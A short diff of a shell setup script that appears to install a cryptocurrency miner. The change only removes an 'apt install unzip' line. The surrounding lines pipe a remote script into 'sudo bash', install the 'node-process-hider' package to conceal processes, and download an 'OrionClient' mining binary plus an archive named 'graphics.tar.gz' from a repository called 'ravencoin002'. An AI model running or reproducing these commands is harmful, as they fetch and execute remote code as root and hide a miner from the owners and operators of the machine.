@@ -17,7 +17,6 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-apt update && apt install unzip
 wget https://github.com/egg5233/ore-hq-client/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod +x OrionClient
 
 wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
